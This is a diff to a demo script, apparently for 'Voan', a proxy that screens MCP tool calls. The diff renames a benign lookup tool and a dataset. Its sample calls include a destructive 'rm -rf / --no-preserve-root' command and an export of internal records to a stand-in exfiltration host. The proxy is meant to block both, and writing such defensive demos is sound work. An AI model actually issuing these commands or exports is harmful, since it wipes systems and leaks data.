@@ -8,7 +8,7 @@ no shared machine required. We launch:
 
 then point the official SDK's streamable-HTTP client at http://127.0.0.1:<port>/mcp.
 Neither the client nor the server knows Voan exists, yet a destructive run_command
-and an exfil export_data are blocked, while a benign check_order passes through.
+and an exfil export_data are blocked, while a benign get_record passes through.
 
     pip install "voan[proxy-http,examples]"
     python examples/mcp_proxy_http_demo.py
@@ -63,9 +63,9 @@ async def main():
             async with ClientSession(read, write) as session:
                 await session.initialize()
                 calls = [
-                    ("check_order", {"order_id": "ORD-1001"}, "benign lookup"),
+                    ("get_record", {"record_id": "REC-1001"}, "benign lookup"),
                     ("run_command", {"command": "rm -rf / --no-preserve-root"}, "destructive"),
-                    ("export_data", {"dataset": "customers",
+                    ("export_data", {"dataset": "internal_records",
                                      "dest": "exfil.evil-collector.net"}, "exfil"),
                     ("export_data", {"dataset": "report",
                                      "dest": "backups.acme.com"}, "legit export"),
